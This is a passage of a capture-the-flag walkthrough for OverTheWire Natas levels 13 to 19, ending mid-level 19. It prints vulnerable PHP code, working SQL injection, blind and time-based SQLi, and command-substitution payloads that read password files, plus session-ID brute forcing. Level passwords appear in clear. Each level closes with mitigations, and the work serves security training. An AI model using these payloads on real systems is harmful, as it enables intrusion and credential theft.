The file <a href="upload/xtd6xg7iv1.php">upload/xtd6xg7iv1.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

When onserved from the browser, we get the response:
```
The file upload/xtd6xg7iv1.php has been uploaded
```

After clicking the link, we navigate to `http://natas13.natas.labs.overthewire.org/upload/xtd6xg7iv1.php` and we ontained the content: 
```
(upperpart of the image file content ...)
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
(lower part of the image file content ...)
```

### Analysis
This level demonstrates a partial mitigation of file upload vulnerabilities using exif_imagetype(). While this check validates the file’s signature, it is still insufficient because:
- It only verifies the beginning of the file (magic bytes)
- It does not prevent additional malicious content embedded inside the file

By crafting a polyglot file (JPEG + PHP), it is possible to bypass the validation and achieve remote code execution (RCE).

Key security lessons:
- File type validation must go beyond magic bytes
- Uploaded files should not be executed by the server
- Files should be stored outside the web root
- Strict allowlists and content sanitization are required


<br><br><br><br><br>







## Natas 14
```
URL: http://natas14.natas.labs.overthewire.org
Username: natas14
Password:  z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
After login, the webpage request input for username and password along with the login button. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
By analyzing the source code, the following SQL query is constructed:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
User input is directly concatenated into the SQL query without any sanitization or parameterization. This introduces a SQL Injection vulnerability.

### Approach 
To exploit this vulnerability, the payload `" OR 1=1#` was used in the username field, the password field can be left empty or filled with any value, and the button login is clicked. 

### Resulting SQL Query
```sql
SELECT * from users where username="" OR 1=1# " and password=""
```
Explanation:
- `"` closes the original string
- `OR 1=1` makes the condition always true
- `#` comments out the remaining part of the query

This causes the query to return at least one valid row, bypassing authentication.

### Exploitation
After submitting the payload, the server responded with: `Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`. This confirms that authentication was successfully bypassed using SQL Injection.


### Analysis
This level demonstrates a classic SQL Injection (SQLi) vulnerability caused by improper handling of user input.

Key issues:
- Direct concatenation of user input into SQL queries
- No input validation or sanitization
- Absence of prepared statements

Security implications:
- Authentication bypass
- Unauthorized data access
- Potential database compromise

Recommended mitigations:
- Use prepared statements (parameterized queries)
- Apply proper input validation and escaping
- Avoid exposing database queries in debug mode

<br><br><br><br><br>







## Natas 15
```
URL: http://natas15.natas.labs.overthewire.org
Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```
After login, the webpage displayed an input field requesting a username, along with a `Check existence` button.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
By analyzing the source code, the following SQL query is constructed:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```
The application directly embeds user input into the SQL query without sanitization, introducing a SQL Injection vulnerability.

However, unlike the previous level, the application does not return query results directly. Instead, it only indicates:
- This user exists.
- This user doesn't exist.

This behavior confirms the presence of a **Boolean-based Blind SQL Injection** vulnerability.

#### Initial testing:
Input: admin → This user doesn't exist.
Input: natas16 → This user exists.

This confirms that `natas16` is a valid username and can be used as a **true condition baseline** for further exploitation.


### Approach 
#### Step 1: Determine Password Length
At the burpsuite, switch on the intercept. At the browser, use the payload `natas16" AND LENGTH(password)=1#` as the input for username and click the `Check existence` button. Then, in the burpsuite, just foward the request content. In the HTTP history, send the request content to the intruder. Inside here, start performing attack. 

Using Burp Suite Intruder:
Position: Select the `1`
Payload type: Numbers
Range: 1 → 40

The response indicating This user exists. was observed when the payload value was 32, confirming the password length is 32

#### Step 2: Extract Password (Character by Character)
A character-based extraction approach was used:
```sql
natas16" AND BINARY SUBSTRING(password,1,1)="a"#
```

Key points:
- SUBSTRING(password, position, 1) extracts one character
- BINARY enforces case-sensitive comparison
- The correct character returns This user exists.


##### Method 1: Sniper Attack (Manual Iteration)
Attack type: Sniper
Position: natas16" AND BINARY SUBSTRING(password,1,1)="`a`"#
Payload Type: Brute forcer
Character set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

Repeat for each position:
natas16" AND BINARY SUBSTRING(password,2,1)="a"#
natas16" AND BINARY SUBSTRING(password,3,1)="a"#
natas16" AND BINARY SUBSTRING(password,4,1)="a"#
...


##### Method 2: Cluster Bomb (Automated)
Attack type: Cluster Bomb
Position: natas16" AND BINARY SUBSTRING(password,`1`,1)="`a`"#
Payload Type 1: Number (1 → 32)
Payload Type 2: Brute forcer (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)


##### Method 3: Prefix Matching
Attack type: Sniper
Position: natas16" AND BINARY password LIKE "`a`%"#
Payload Type: Brute forcer
Character set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

Then iteratively builds the password:
natas16" AND BINARY password LIKE "h`a`%"#
natas16" AND BINARY password LIKE "hP`a`%"#
natas16" AND BINARY password LIKE "hPk`a`%"#


### Result
By iterating through all positions, the extracted password is combined and obtained: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo


### Analysis
This level demonstrates a Boolean-based Blind SQL Injection vulnerability.

Key characteristics:
- No direct data output
- Application reveals only TRUE/FALSE responses
- Data extraction is performed through inference

Security issues:
- Unsanitized user input in SQL queries
- Lack of prepared statements
- Information leakage via response differences

Recommended mitigations:
- Use parameterized queries (prepared statements)
- Avoid exposing query behavior through responses
- Implement proper input validation

<br><br><br><br><br>







## Natas 16
```
URL: http://natas16.natas.labs.overthewire.org
Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
After login, the webpage displayed a message For security reasons, we now filter even more on certain characters, along with an input field labeled “Find words containing:” and a Search button.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
From the source code, user input is passed into a system command: `passthru("grep -i \"$key\" dictionary.txt");`. Although certain characters are filtered using: `preg_match('/[;|&`\'"]/',$key)`, the application still allows command substitution using: `$(...)`. This introduces a Command Injection vulnerability, specifically via command substitution.

#### Initial Testing: 
Input: aa
Output: 
```
aardvark
aardvark's
bazaar
bazaar's
bazaars
```
This confirms that the input is directly used in the grep command.


### Approach 
To exploit the vulnerability, command substitution using $() is used. The key idea is to inject a command that checks the password file:
```
grep ^a /etc/natas_webpass/natas17
```
If the password starts with a → output exists
If not → no output

#### Payload Example:
```
$(grep ^a /etc/natas_webpass/natas17)aa
```

#### Resulting command:
```
grep -i "$(grep ^a /etc/natas_webpass/natas17)aa" dictionary.txt
```

#### Behavior
- If the condition is TRUE (correct character):
  → grep receives a valid pattern → dictionary results are returned
- If the condition is FALSE:
  → empty substitution → no meaningful output
This creates a Boolean-based command injection channel.

#### Password Extraction
The password is extracted character by character using prefix matching through Burpsuite.

##### Step-by-step process:
```
$(grep ^a /etc/natas_webpass/natas17)aa
$(grep ^E /etc/natas_webpass/natas17)aa
$(grep ^Eq /etc/natas_webpass/natas17)aa
$(grep ^Eqj /etc/natas_webpass/natas17)aa
```
Each step confirms whether the prefix is correct.

#### Result
By iterating through all characters, the password for the next level is obtained (EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC).


### Analysis
This level demonstrates a Command Injection vulnerability despite input filtering.

Key issues:
- User input is directly passed into a system command
- Incomplete filtering (missed $() command substitution)
- Reliance on blacklist filtering instead of secure handling

Security implications:
- Arbitrary command execution
- Access to sensitive system files
- Full compromise of the application environment

Recommended mitigations:
- Avoid using system commands with user input
- Use safe APIs instead of passthru()
- Apply strict input validation (allowlist)
- Escape user input properly (e.g., escapeshellarg)


<br><br><br><br><br>







## Natas 17
```
URL: http://natas17.natas.labs.overthewire.org
Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```
After login, the webpage displayed an input field requesting a username, along with a Check existence button.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
From the source code:
```
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```
User input is directly embedded into the SQL query without sanitization, indicating a SQL Injection vulnerability.

However, unlike the previous level:
- No output is displayed regardless of the query result
- No TRUE/FALSE response is visible
This confirms a Time-based Blind SQL Injection vulnerability.


### Approach 
#### Step 1: Confirm Time-Based Injection
Payload: `natas18" AND SLEEP(5)#`

Observation:
- If the condition is valid → response delayed (~5 seconds)
- If invalid → immediate response
This confirms that execution time can be used as a side-channel.

#### Step 2: Determine Password Length
Payload pattern:
```
natas18" AND (SELECT LENGTH(password)=32 FROM users WHERE username="natas18") AND SLEEP(5)#
```

Using Burp Suite:
- Iterate values from 1 → 40
- Monitor response time

Result: `Password length = 32`

#### Step 3: Extract Password (Prefix Matching)
Use prefix-based extraction with `LIKE`:
```
natas18" AND (SELECT BINARY password LIKE "a%" FROM users WHERE username="natas18") AND SLEEP(5)#
```
If response is delayed → prefix is correct

#### Iterative Extraction
Build the password character by character:
- `natas18" AND (SELECT BINARY password LIKE "6%" FROM users WHERE username="natas18") AND SLEEP(5)#`
- `natas18" AND (SELECT BINARY password LIKE "6O%" FROM users WHERE username="natas18") AND SLEEP(5)#`
- `natas18" AND (SELECT BINARY password LIKE "6OG%" FROM users WHERE username="natas18") AND SLEEP(5)#`

Repeat until all 32 characters are obtained.

#### Result
The extracted password is: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`


### Analysis
This level demonstrates a Time-based Blind SQL Injection vulnerability.

Key characteristics:
- No visible output from the application
- Exploitation relies on measuring response time
- Uses database functions like SLEEP() as a side channel

Security issues:
- Unsanitized SQL query construction
- Lack of prepared statements
- No protection against timing-based attacks

Recommended mitigations:
- Use parameterized queries (prepared statements)
- Implement query time limits
- Avoid exposing database behavior through timing differences


<br><br><br><br><br>







## Natas 18
```
URL: http://natas18.natas.labs.overthewire.org
Username: natas18
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```
After login, the webpage displayed username and password input fields, along with a Login button.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
From the source code, the session mechanism has several weaknesses:
#### Session ID is predictable
```
$maxid = 640;
return rand(1, $maxid);
```
- Session IDs are limited to values between 1 and 640

#### Admin authentication is disabled
`//return 1;`
- Even if username = admin, admin access is never granted normally

#### Session trust issue
`if($_SESSION["admin"] == 1)`
- The application trusts the session value without strong validation

This indicates a Session Fixation / Session ID Brute Force vulnerability.


### Approach 
#### Step 1: Obtain a Valid Session
Login with any credentials (e.g., username: admin; password: admin).

Capture the request using Burp Suite:
```
GET / HTTP/1.1
Host: natas18.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=459
Upgrade-Insecure-Requests: 1

PHPSESSID=459
```
This is to confirm that: `A session is created` and `Session ID is numeric`. 

**Note:** After logging in, refresh the page before capturing the request in Burp Suite. Otherwise, the PHPSESSID may not be included, as it is not assigned during the initial login request.

#### Step 2: Identify Attack Surface
Since `Session IDs range from 1 to 640`, the `Admin sessions must exist within this range`. Therefore, We can brute force all possible session IDs.

#### Step 3: Brute Force Session IDs
Using Burp Suite Intruder:
```
Target: `Cookie: PHPSESSID=§1§`
```
Payload settings:
- Type: Numbers
- Range: 1 → 640

#### Step 4: Identify Valid Admin Session
Below is the content that have successfully captured. 
##### Request content: 
```
GET / HTTP/1.1
Host: natas18.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=119
Upgrade-Insecure-Requests: 1
```


##### Response content:
```
HTTP/1.1 200 OK
Date: Fri, 17 Apr 2026 15:37:57 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1024
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Result
The server returned:
```
You are an admin. The credentials for the next level are:

Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

### Analysis
This level demonstrates insecure session management:

Vulnerabilities:
- Predictable session IDs (rand(1,640))
- Small session ID space → easy brute force
- No session binding (IP/User-Agent not validated)
- Trusting client-controlled session identifiers

Attack Type:
- Session ID brute force / session hijacking

Impact:
- Unauthorized privilege escalation to admin
- Full access to protected credentials

Session IDs must be:
- Cryptographically secure (not predictable)
- Large enough to prevent brute force
- Properly validated and bound to user context

<br><br><br><br><br>







## Natas 19
```
URL: http://natas19.natas.labs.overthewire.org
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```
After login, the webpage displayed a message: 
```
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.
```
It also provided username and password input fields along with a Login button.

Additionally, viewing the page source (CTRL+U) revealed the following:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>

<p>
Please login with your admin account to retrieve credentials for natas20.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
</div>
</body>
</html>
```

### Finding 
Attempting to log in using `username: admin` and `password: admin`. Initially, after login, the content captured using burpsuite
#### Request content: 
```
POST /index.php HTTP/1.1
Host: natas19.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://natas19.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
Connection: keep-alive
Referer: http://natas19.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

#### Response content: 
```
HTTP/1.1 200 OK
Date: Sat, 18 Apr 2026 05:58:40 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=3531362d61646d696e; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1029
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>
</body>
</html>
```

After refreshing the browser,
#### Request content: 
```
POST /index.php HTTP/1.1
Host: natas19.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://natas19.natas.labs.overthewire.org/
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://natas19.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=3531362d61646d696e
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

#### Response content: 
```
HTTP/1.1 200 OK
Date: Sat, 18 Apr 2026 06:00:47 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1029
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>
</body>
</html>
```
The response sets a session cookie, `Set-Cookie: PHPSESSID=3531362d61646d696e. 

#### Decoding the Session ID
The value 3531362d61646d696e appears to be hex-encoded. Decoding it from hexadecimal: `3531362d61646d696e → 516-admin`. This reveals that the session ID format is `<session_number>-<username>`.

This indicates:
- Session IDs are not random
- They are predictable and encoded


### Approach 
#### Step 1: Understand the Pattern
From decoding: `PHPSESSID = hex(<id>-<username>)`. Example: `516-admin → 3531362d61646d696e`

#### Step 2: Identify Weakness
Similar to the previous level:
- Session IDs are still based on a numeric range
- The difference is that they are now hex-encoded strings

Thus, the attack becomes:
- Brute force numeric IDs (1–640)
- Append -admin
- Encode in hex
- Send as PHPSESSID


#### Step 3: Brute Force Using Burp Suite
Payload Preprocessing: `<ID>-admin → hex encode → PHPSESSID`. (selecting id part to be brute forced as number, and add suffix after the number and encode using ASCII hex)
Example payload: `281-admin → 3238312d61646d696e`


#### Step 4: Identify Successful Response
##### Request content:
```
